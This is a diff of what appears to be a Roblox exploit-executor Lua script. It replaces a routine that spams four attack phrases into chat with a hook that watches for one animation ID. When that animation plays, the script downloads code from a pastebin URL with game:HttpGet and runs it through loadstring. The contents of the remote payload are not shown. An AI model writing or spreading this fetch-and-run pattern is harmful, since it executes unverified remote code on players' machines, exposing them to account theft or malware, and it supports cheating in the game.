@@ -1,19 +1,32 @@
-local player = game.Players.LocalPlayer
-repeat wait() until player.Character
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
--- Define the messages you want to send
-local messages = {"SCALE OF THE DRAGON.", "RECOIL.", "TWIN METEORS.", "WORLD CUTTING SLASH!"}
-
--- Function to send messages to the chat
-local function sendMessage(text)
-    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
+function onAnimation(id, func)
+    local id = tostring(id):gsub("rbxassetid://", "")
+    
+    local char = game:GetService("Players").LocalPlayer.Character
+    local humanoid = char and char:WaitForChild("Humanoid", 1)
+    if char and humanoid then
+        humanoid.AnimationPlayed:Connect(function(v)
+            local vID = v.Animation.AnimationId:gsub("rbxassetid://", "")
+            if id == vID then
+                func(v)
+            end
+        end)
+    end
+    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
+        local humanoid = char and char:WaitForChild("Humanoid", 1)
+        if char and humanoid then
+            humanoid.AnimationPlayed:Connect(function(v)
+                local vID = v.Animation.AnimationId:gsub("rbxassetid://", "")
+                if id == vID then
+                    func(v)
+                end
+            end)
+        end
+    end)
 end
 
--- Send each message one time with a 1-second delay
-for _, message in ipairs(messages) do
-    sendMessage(message)
-    wait(2) -- Wait 2 seconds before sending the next message
-end
+
+
+onAnimation("11365563255", function(animation)
+    loadstring(game:HttpGet("https://pastebin.com/raw/XGUFibCJ"))()
+    warn("animation id:", animation.Animation.AnimationId)
+end)
